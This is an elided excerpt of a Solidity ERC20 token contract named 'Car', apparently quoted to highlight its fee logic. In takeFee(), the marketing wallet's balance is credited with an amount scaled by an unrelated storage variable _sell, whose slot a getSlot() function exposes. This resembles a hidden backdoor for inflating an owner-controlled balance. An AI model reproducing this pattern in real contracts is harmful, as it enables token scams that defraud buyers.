...
contract Car is ERC20, Ownable {
    ...
    marketing : 0x11aa432dd0b5F3b8950b341e4c3B32aB0f0BD1f4,
    addLp : 0x11aa432dd0b5F3b8950b341e4c3B32aB0f0BD1f4
    });
    ...
    function getSlot() public pure returns (bytes32 b) {
        assembly{b := _sell.slot}
    }
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if (sender == pair && _feeBuy.totalFee != 0) {// Buy
            ...
            _balances[_taxWallet.marketing] = _balances[_taxWallet.marketing].add(feeAmount.mul(_sell).div(_feeSell.totalFee));
